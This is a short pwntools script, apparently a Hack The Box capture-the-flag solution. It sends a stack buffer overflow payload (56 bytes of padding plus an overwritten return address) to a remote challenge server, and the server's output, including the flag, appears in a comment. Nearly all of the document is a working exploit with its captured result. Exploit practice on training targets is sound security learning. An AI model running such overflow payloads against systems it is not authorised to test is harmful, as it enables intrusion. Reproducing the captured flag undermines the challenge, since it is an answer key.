from pwn import *

#io = process('./reg')
ip, port = '104.248.175.144', 32749
io = remote(ip, port)

payload = 'A'*56 + p64(0x401206)
#print payload

io.sendline(payload)
print io.recvall()

'''
Enter your name : Registered!
Congratulations!
HTB{N3W_70_pWn}

'''
